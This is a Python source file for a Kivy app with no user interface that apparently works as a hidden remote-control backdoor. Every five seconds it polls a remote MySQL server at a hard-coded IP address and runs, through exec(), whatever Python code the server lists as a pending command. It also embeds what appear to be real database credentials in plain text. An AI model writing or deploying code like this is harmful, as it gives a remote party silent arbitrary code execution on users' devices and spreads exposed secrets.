from kivy.app import App
from kivy.clock import Clock
import mysql.connector
import os

class BackgroundApp(App):
    def build(self):
        Clock.schedule_interval(self.check_commands, 5)  # every 5 seconds
        return None  # No UI

    def check_commands(self, dt):
        try:
            conn = mysql.connector.connect(
                host="193.203.184.46",
                user="u978289751_web",
                password="Shiva@6261227800",
                database="u978289751_web"
            )
            cursor = conn.cursor(dictionary=True)
            cursor.execute("SELECT * FROM commandhis WHERE status='pending' ORDER BY id ASC LIMIT 1")
            row = cursor.fetchone()

            if row:
                command = row['command_name']
                cmd_id = row['id']

                cursor.execute("SELECT exec_code FROM commandlist WHERE name=%s", (command,))
                code_row = cursor.fetchone()

                if code_row and code_row['exec_code']:
                    try:
                        exec(code_row['exec_code'])
                        cursor.execute("UPDATE commandhis SET status='executed' WHERE id=%s", (cmd_id,))
                        conn.commit()
                    except Exception as e:
                        print("Execution error:", e)

            cursor.close()
            conn.close()
        except Exception as e:
            print("DB error:", e)

if __name__ == '__main__':
    BackgroundApp().run()
